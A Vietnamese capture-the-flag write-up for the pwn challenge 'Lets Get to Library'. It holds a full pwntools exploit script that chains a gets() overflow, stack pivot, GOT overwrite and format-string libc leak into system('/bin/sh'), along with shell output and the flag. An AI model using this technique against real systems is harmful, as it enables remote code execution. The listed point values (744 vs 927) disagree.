---
title: "Lets Get to Library"
category: "Pwn"
tags: ["stack-buffer-overflow", "partial-relro", "got-overwrite", "format-string", "lazy-binding", "stack-pivot"]
solve_date: "2026-10-10T14:57:00+07:00"
language: "vi"
points: 744
---

# Lets Get to Library

**Flag:** `kBxAc{_H3y_l3ts_g0_t0_l1br4ry_t0g3th3r_t0_g3t_h3r_t0_g3t_b3tt3r_wh4t_3v3r_wh3n3v3r_1_d0nt_kn0w_wh4t_1_4m_typ1ng_}`  
**Tác giả:** k3rn3lbr3ach3r  
**Service:** `nc 104.154.133.139 1337`  
**File đề:** `handout.7z` (binary + `libc.so.6` + `ld-2.39.so`)

| Artifact | Bytes | SHA-256 |
|---|---:|---|
| `handout.7z` | 834,735 | `e6640ce2b8a9dc006c58ee59d349e04dc92248313ea17ea7304cbab8983b165a` |
| `letsgettolibrary` | 16,016 | `08629a6ea388745d26407095c106dcfa0fb445f90c1300a98b475f10a6ce4497` |
| `libc.so.6` | 2,125,328 | `269ffadc51484e5e2cbcb9100a5e1cd78a72493c0e3e7b0611a5a4778718d8e9` |
| `ld-2.39.so` | 236,616 | `1d7133d7b9f94465978b2ae8d21ca3751c8dfaaecaa2d462aeaf1ec50e5c3a90` |

`flag.txt` đi kèm chỉ chứa giá trị mẫu `kBxAc{TEST_FLAG}`; cờ thật phải đọc từ service. Dockerfile của đề chạy binary bằng `socat TCP-LISTEN:1337,reuseaddr,fork` dưới user `player` (uid 1337), flag đặt ở `/app/flag.txt`, mode 444.

## Đề bài

Thông tin đề cho: tên bài `Lets Get to Library`, category Pwn, 927 điểm, service `nc 104.154.133.139 1337`, format cờ `kBxAc{...}`. Artifact gồm binary và libc/linker đi kèm. Chương trình chỉ làm ba việc: in lời chào, đọc một dòng bằng `gets()`, in lời chào trả lời; mục tiêu là lấy cờ từ service đang chạy.

## Phân tích

### Bảo vệ và cấu trúc bộ nhớ

```text
Arch:     amd64-64-little
RELRO:    Partial RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x400000)
RUNPATH:  b'.'
```

Partial RELRO dừng ở ngay trước `0x404000`, nên ba slot GOT vẫn ghi được; `ld-2.39.so` được load theo `.interp`/`RUNPATH` nên lazy binding còn hoạt động:

```text
Offset             Type               Symbol's Name
0000000000404000   R_X86_64_JUMP_SLOT setbuf@GLIBC_2.2.5
0000000000404008   R_X86_64_JUMP_SLOT printf@GLIBC_2.2.5
0000000000404010   R_X86_64_JUMP_SLOT gets@GLIBC_2.2.5
0000000000404030   R_X86_64_COPY      stdout@GLIBC_2.2.5
0000000000404040   R_X86_64_COPY      stdin@GLIBC_2.2.5
```

Hai loại `R_X86_64_COPY` rất quan trọng: `stdout`/`stdin` mà libc tự tham chiếu nằm ngay trong `.bss` của binary (`0x404030`, `0x404040`), nên mọi `printf`/`gets` về sau đều đi qua bản copy đó.

`.bss` kết thúc ở `0x404050`, nhưng trang RW kéo dài tới `0x404fff` — toàn bộ `0x404050..0x404fff` là vùng ghi được, chưa dùng, đủ chỗ cho "stack giả".

### Chỉ ba gadget

```text
0401146 <greet_reader>:
  401146: push rbp ; mov rbp,rsp
  40114a: lea rax,[rip+0xeb7]      # 402008 "Welcome to the library, Dear reader"
  401154: mov eax,0x0
  401159: call printf@plt
  40115f: pop rbp ; ret

0401161 <main>:
  401161: push rbp ; mov rbp,rsp ; add rsp,-0x80
  401169: mov rax,[rip+0x2ed0]     # 404040 stdin ; mov esi,0 ; call setbuf@plt
  40117d: mov rax,[rip+0x2eac]     # 404030 stdout ; mov esi,0 ; call setbuf@plt
  401191: lea rax,[rip+0xe98]      # "Enter your name to check out a book: " ; call printf@plt
  4011a5: lea rax,[rbp-0x80] ; mov rdi,rax ; mov eax,0x0 ; call gets@plt
  4011b6: call greet_reader
  4011bb: mov eax,0x0
  4011c0: leave ; ret
```

Không tồn tại `pop rdi`/`pop rsi`/`pop rdx` nào khác; `main` không có vòng lặp và `gets` chỉ được gọi một lần. Nhưng ba địa chỉ `0x40115f` (`pop rbp; ret`), `0x4011a5` (đọc một dòng vào `rbp-0x80`), `0x4011c0` (`leave; ret`) là đủ:

- Tràn buffer 0x80 byte để chiếm saved rbp + return address, rồi nhảy vào `pop rbp; ret` nạp một `rbp` tùy ý và `leave; ret`.
- `leave; ret` đặt `rsp := rbp`, `rbp := [rbp]`, `rip := [rbp+8]`. Vì `gets@plt` return vào đúng `greet_reader` (chỉ `pop rbp; ret`, không `push rbp`), kết thúc mỗi vòng luôn là `leave; ret` với `rbp` đã thiết lập.
- Một "bounce frame" `X` với `[X] = rbp_new`, `[X+8] = rip_new` cho phép chọn đồng thời **đích đọc** của dòng tiếp theo (`rbp-0x80`) và **rsp** cho libc.

Ràng buộc rút ra từ lỗi quan sát được (xem mục cuối):

1. Frame của libc (`gets`, `printf`) dài hàng trăm tới ~0xa00 byte và **hướng xuống**, nên mọi cấu trúc còn dùng sau một lần gọi libc được đặt **phía trên** vùng stack của lần gọi đó.
2. Các lệnh `call` phải giữ rsp bội số 16 tại thời điểm call (printf dùng `movaps`).
3. `gets()` chỉ dừng ở `\n`, do đó byte `0x00` ghi được bình thường — ta viết trọn con trỏ 8 byte; byte NUL do `gets` tự thêm sẽ rơi vào vùng trống `.data` tại `0x404018` (khi đích là `0x404010`), hoặc tại `0x404120` (khi đích là `0x404090` với 144 byte).

## Lời giải

Sau vòng ghi blob ban đầu, các vòng R1–R5 được điều khiển qua bounce frame trong trang RW. Bố trí blob:

| Địa chỉ | Vai trò |
|---|---|
| `0x404050` | đầu blob (IMAGE), độ dài 3664 byte |
| `0x404090`, `0x404098` | cặp điều khiển LOW: `[rbp]`/`[rbp+8]` của vòng có `rbp = 0x404090` → đích đọc = `0x404010` (gets@GOT) |
| `0x4040d0`, `0x4040d8` | cặp điều khiển của vòng ghi blob |
| `0x404110`, `0x404118` | cặp điều khiển cho vòng ghi vào LOW |
| `0x404a00` | bounce của R1 |
| `0x404b00` | bounce của R2 (printf); `0x404b10` = rsp lúc call, cũng là chỗ các tham số stack của format string |
| `0x404b80` | format string |
| `0x404c00` | cặp điều khiển của vòng printf |
| `0x404c40`, `0x404cc0`, `0x404d40` | bounce của R3, R4, R5 |
| `0x404e00` | chuỗi `/bin/sh` |

**R1** — `rbp = 0x404090` nên `rdi = 0x404010`; dòng 8 byte `p64(printf@plt)` biến `gets@GOT` thành `printf@plt`. Từ đây `call gets@plt` không còn đọc nữa.

**R2** — `rbp = 0x404b80 + 0x80` nên `rdi = 0x404b80`: `call gets@plt` nhảy sang `printf@plt`, tức in theo format string ta đặt sẵn. Format:

```text
MRK%c%c%c%c%c%s%72c%hhn
```

`%c` năm lần tiêu thụ 5 tham số thanh ghi (`rsi, rdx, rcx, r8, r9`) mà ta không kiểm soát; `%s` là tham số stack thứ nhất (nằm đúng tại rsp lúc call = `0x404b10`) trỏ vào `0x404000`, in ra **6 byte thô** của `setbuf@GOT` = địa chỉ libc thật. Số byte đã in tích lũy: `3 (MRK) + 5 + 6 + 72 = 86 = 0x56`, nên `%hhn` (tham số stack thứ ba, trỏ `0x404010`) ghi `0x56` vào byte thấp của `gets@GOT`:

```text
0x401040 (printf@plt)  ->  0x401056 (the resolver stub inside gets@plt)
```

Đây là mấu chốt khôi phục khả năng đọc: ta không cần biết địa chỉ libc để làm việc này, và khi `call gets@plt` lần tới xảy ra, chính ld.so sẽ giải `gets` và **tự ghi trọn con trỏ 8 byte** của `gets` thật vào GOT, rồi nhảy vào `gets` với `rdi` còn nguyên — tức vòng tiếp theo lại là một vòng đọc hợp lệ, stdout vẫn là FILE* thật.

**R3** — `rbp = 0x404110` nên đích đọc = `0x404090` (LOW). Frame của printf ở R2 đã ghi đè lên LOW và `0x404110`, nên dòng 144 byte này viết lại cả hai cặp điều khiển: `LOW := (0x404d40, leave;ret)` và `0x404110 := (0x404cc0, leave;ret)`.

**R4** — `rbp = 0x404090`, đích đọc = `gets@GOT`; 8 byte `p64(base + 0x58740)` đặt `system` vào GOT. `base` tính từ leak: `base = u64(leak) - 0x8f740`.

**R5** — `rbp = 0x404e80` nên `rdi = 0x404e00 = "/bin/sh"`; `call gets@plt` giờ là `system("/bin/sh")`. Shell thừa hưởng socket của socat nên stdout/stderr của lệnh trả về đúng kết nối.

Toàn bộ script (`solve.py`, cần `libc.so.6` cùng thư mục để lấy offset; có tự retry vì leak có thể bị cắt bởi byte 0):

```python
#!/usr/bin/env python3
"""letsgettolibrary (kBxAc, Pwn 927). Rounds:
  B0 rbp=0x4040d0 IMAGE@0x404050 (3664B): bounce frames, format, args, "/bin/sh"
  R1 rbp=0x404090 8B @gets@GOT := printf@plt
  R2 rdi=0x404b80 printf(FMT): %s leaks setbuf@GOT (6 raw bytes);
     %hhn writes 0x56 -> gets@GOT becomes 0x401056 = gets' resolver stub,
     so the next gets@plt call lets ld.so install the real libc gets again
  R3 rbp=0x404110 144B @0x404090 rewrite LOW/0x404110 pairs clobbered by printf
  R4 rbp=0x404090 8B @gets@GOT := libc system
  R5 rbp=0x404e80 rdi = 0x404e00 "/bin/sh" -> system("/bin/sh")
"""
import os, sys
from pwn import *
# On Windows pwntools' ELF() emulates the PLT with unicorn and crashes; skip it.
try:
    import pwnlib.elf.elf as _e
    _e.ELF._populate_plt = lambda self: None
except Exception:
    pass

HOST = os.environ.get('H', '104.154.133.139')
PORT = int(os.environ.get('P', '1337'))
BANNER = b'Welcome to the library, Dear reader'
PROMPT = b'Enter your name to check out a book: '
MRK = b'MRK'

SETUP_WR, POP_RBP, LEAVERET = 0x4011a5, 0x40115f, 0x4011c0
PLT_PRINTF = 0x401040
GOT_SETBUF, GOT_GETS = 0x404000, 0x404010

IMAGE, IMGEND = 0x404050, 0x404ea0
R_IMG, LOW, R_LOWWR = 0x4040d0, 0x404090, 0x404110
X1 = 0x404a00                         # R1 bounce (consumed before printf)
XP = 0x404b00                         # printf bounce; 0x404b10 and up survive it
ARGS = XP + 0x10                      # first stack argument of printf
FMT, R_FMT = 0x404b80, 0x404c00       # R_FMT = FMT+0x80 = printf round's pair
XL, XG2 = 0x404c40, 0x404cc0
XS = 0x404d40                         # above R4's call site 0x404cd0
SH, R_SH = 0x404e00, 0x404e80
assert all(x % 16 == 0 for x in (X1, XP, XL, XG2, XS))

OFF_SETBUF, OFF_SYSTEM = 0x8f740, 0x58740      # readelf -sW libc.so.6
if os.path.exists('libc.so.6'):
    _l = ELF('libc.so.6')
    OFF_SETBUF, OFF_SYSTEM = _l.symbols['setbuf'], _l.symbols['system']

# 3 + 5 + 6 + 72 = 86 = 0x56 written by %hhn into gets@GOT byte 0
FMT_STR = MRK + b'%c%c%c%c%c%s' + b'%72c%hhn'


class Img:
    def __init__(self, base):
        self.base, self.d = base, {}

    def put(self, a, c):
        old = self.d.get(a)
        assert old is None or old == c, 'conflict at %#x' % a
        self.d[a] = c

    def q(self, a, v):
        for i, c in enumerate(p64(v)):
            self.put(a + i, c)
        return self

    def b(self, a, data):
        for i, c in enumerate(data):
            self.put(a + i, c)
        return self

    def out(self, end):
        buf = bytearray(end - self.base)
        for a, c in self.d.items():
            assert self.base <= a < end, 'out of range %#x' % a
            buf[a - self.base] = c
        bad = [hex(self.base + i) for i, c in enumerate(buf) if c == 0x0a]
        assert not bad, 'newline at %s' % bad
        return bytes(buf)


def bounce(p, x, rbp):
    """leave;ret landing on x -> rbp/rip, call site rsp = x+0x10"""
    p.q(x, rbp)
    p.q(x + 8, SETUP_WR)


def build():
    p = Img(IMAGE)
    p.q(R_IMG, X1); p.q(R_IMG + 8, LEAVERET)         # B0 -> R1
    p.q(LOW, XP); p.q(LOW + 8, LEAVERET)             # R1 -> R2 (printf)
    p.q(R_FMT, XL); p.q(R_FMT + 8, LEAVERET)         # R2 -> R3
    p.q(R_LOWWR, XG2); p.q(R_LOWWR + 8, LEAVERET)    # R3 -> R4
    bounce(p, X1, LOW)                               # R1: rdi = gets@GOT
    bounce(p, XP, R_FMT)                             # R2: rdi = FMT
    bounce(p, XL, R_LOWWR)                           # R3: rdi = 0x404090
    bounce(p, XG2, LOW)                              # R4: rdi = gets@GOT
    bounce(p, XS, R_SH)                              # R5: rdi = "/bin/sh"
    p.q(ARGS, GOT_SETBUF)                            # %s leak target
    p.q(ARGS + 8, GOT_GETS)                          # %c char sink
    p.q(ARGS + 0x10, GOT_GETS)                       # %hhn target
    p.b(FMT, FMT_STR)
    p.b(SH, b'/bin/sh\0')
    return p.out(IMGEND)


L_R1 = p64(PLT_PRINTF)
L_R3 = (p64(XS) + p64(LEAVERET) + b'B' * (R_LOWWR - (LOW + 16))
        + p64(XG2) + p64(LEAVERET))


def drain(r, secs=3.0):
    buf = b''
    r.settimeout(secs)
    try:
        while True:
            c = r.recv(timeout=secs)
            if not c:
                break
            buf += c
    except Exception:
        pass
    return buf


def parse(out):
    """the 6 leaked bytes sit right after the five %c bytes following MRK"""
    i = out.rfind(MRK)
    if i < 0:
        log.warning('no marker %r' % out[-70:])
        return None
    tail = out[i + 3:i + 40]
    for k in range(12):
        raw = tail[k:k + 6]
        if len(raw) < 6:
            break
        base = u64(raw + b'\0\0') - OFF_SETBUF
        if base & 0xfff == 0 and 0x7f0000000000 < base < 0x800000000000:
            log.info('leak %r at +%d -> base %#x' % (raw, k, base))
            return base
    log.warning('no aligned base, tail=%r' % tail)
    return None


def attempt(n):
    r = remote(HOST, PORT, timeout=30)
    r.settimeout(8)
    r.recvuntil(b'book: ', timeout=10)
    r.sendline(b'A' * 0x80 + p64(0x41414141) + p64(POP_RBP)
               + p64(R_IMG) + p64(SETUP_WR))
    r.sendline(build())
    r.sendline(L_R1)
    base = parse(drain(r, 4))
    log.info('try%d base=%s' % (n, base and hex(base)))
    ptr = p64(base + OFF_SYSTEM) if base else None
    if ptr is None or b'\x0a' in ptr:      # a 0x0a would truncate the write
        r.close()
        return None
    r.sendline(L_R3)
    drain(r, 2)
    r.sendline(ptr)
    drain(r, 2)
    r.sendline(b'id; cat /app/flag.txt 2>&1; echo __DONE__')
    res = drain(r, 8)
    print(res.decode('utf-8', 'replace'))
    r.close()
    if b'__DONE__' in res:
        open('SHELL_%d.bin' % n, 'wb').write(res)
        return res
    return None


if __name__ == '__main__':
    for n in range(1, (int(sys.argv[1]) if len(sys.argv) > 1 else 8) + 1):
        try:
            if attempt(n):
                break
        except Exception as e:
            log.warning('try%d %s: %s' % (n, type(e).__name__, e))
```

Hai lần chạy liên tiếp cho cùng kết quả với base ASLR khác nhau:

```text
[*] leak b'@W\x83\x04\xe4\x7f' at +5 -> base 0x7fe4047a6000
[*] leak b'@\xf7[&\x98\x7f' at +5 -> base 0x7f9826530000
```

```text
uid=1337(player) gid=1337(player) groups=1337(player)
kBxAc{_H3y_l3ts_g0_t0_l1br4ry_t0g3th3r_t0_g3t_h3r_t0_g3t_b3tt3r_wh4t_3v3r_wh3n3v3r_1_d0nt_kn0w_wh4t_1_4m_typ1ng_}__DONE__
```

`/app/flag.txt` không có newline ở cuối nên marker `__DONE__` dính liền sau `}`; byte của cờ được lưu nguyên văn trong `SHELL_1.bin`.

## Các hướng đã kiểm tra

Ba lỗi sau không phải sự cố môi trường mà là ràng buộc của chính tiến trình, và chúng quyết định bố trí bộ nhớ ở trên:

- **Format string có `%N$` (positional) làm chết tiến trình.** Với `FMT = b'%6$s'` hoặc `b'%1$p'`, vòng printf không in ra gì và connection đóng; trong khi `b'ABC'`, `b'%p'`, `b'%p%p%p%p%p%pMRK%s'` (không định vị) đều chạy và in đủ. Paths positional của `vfprintf` cấp phát thêm bộ nhớ theo format, vượt quá khoảng trống giữa rsp và đầu trang `0x404000`, nên lời giải chỉ dùng conversion không định vị.
- **Không được ghi đè `0x404030`/`0x404040`.** Khi các bản copy `stdout`/`stdin` bị thay bằng giá trị khác (lần đọc tiếp theo không còn FILE* hợp lệ), vòng kế tiếp chết ngay tại banner; do đó blob bắt đầu từ `0x404050` và `system` được gọi qua `gets@GOT`, không qua đường setbuf.
- **Frame libc hướng xuống.** Khi bounce frame của vòng cuối (`0x404c80`) còn nằm dưới địa điểm gọi của vòng áp chót (`0x404cd0`), R4 hoàn tất nhưng R5 crash không in gì; chuyển `XS`/`SH`/`R_SH` lên `0x404d40`/`0x404e00`/`0x404e80` thì chuỗi vòng chạy hết. Tương tự, R3 tồn tại chỉ để viết lại cặp LOW và `0x404110` mà frame printf đã ghi đè.

## Kết quả

Cờ đọc trực tiếp từ service qua shell có được sau `system("/bin/sh")`, với identity `uid=1337(player)` đúng như user trong Dockerfile của đề:

```text
kBxAc{_H3y_l3ts_g0_t0_l1br4ry_t0g3th3r_t0_g3t_h3r_t0_g3t_b3tt3r_wh4t_3v3r_wh3n3v3r_1_d0nt_kn0w_wh4t_1_4m_typ1ng_}
```

Chưa lưu phản hồi submission.

## Tái hiện

Cần Python 3 + pwntools (`pip install pwntools`). Lưu fenced block trong phần Lời giải thành `solve.py`, đặt `libc.so.6` (bản trong handout) cùng thư mục để script lấy offset `setbuf`/`system`; nếu không có file, script dùng offset cố định `0x8f740` / `0x58740` — kiểm chứng bằng:

```bash
readelf -sW libc.so.6 | grep -E " (setbuf|system|gets)@"
```

```text
 550: 000000000008f740   14 FUNC  GLOBAL DEFAULT 17 setbuf@@GLIBC_2.2.5
 791: 0000000000087070  478 FUNC  WEAK   DEFAULT 17 gets@@GLIBC_2.2.5
1050: 0000000000058740   45 FUNC  WEAK   DEFAULT 17 system@@GLIBC_2.2.5
```

```bash
python solve.py 8
```

```text
[*] try1 base=0x7f9826530000
uid=1337(player) gid=1337(player) groups=1337(player)
kBxAc{...}__DONE__
```

Vài lưu ý khi chạy lại:

- Script tự retry (mặc định 8 lần) vì hai khả năng ngẫu nhiên: 6 byte leak bị cắt khi một byte trung gian bằng `0x00` , hoặc `p64(base + system)` chứa byte `0x0a` khiến dòng R4 bị cắt. Cả hai đều được phát hiện và bỏ qua, connection mới sẽ cho base khác.
- Trên Windows, `ELF()` của pwntools mô phỏng PLT bằng unicorn và crash; hai dòng `pwnlib.elf.elf.ELF._populate_plt = lambda self: None` trong `solve.py` tắt bước đó. Trên Linux có thể bỏ.
- Muốn xem từng vòng, chèn `drain(r, 2)` sau mỗi `sendline` và đếm số lần `BANNER`: mỗi vòng đọc kết thúc bằng đúng một lần in `Welcome to the library, Dear reader`.
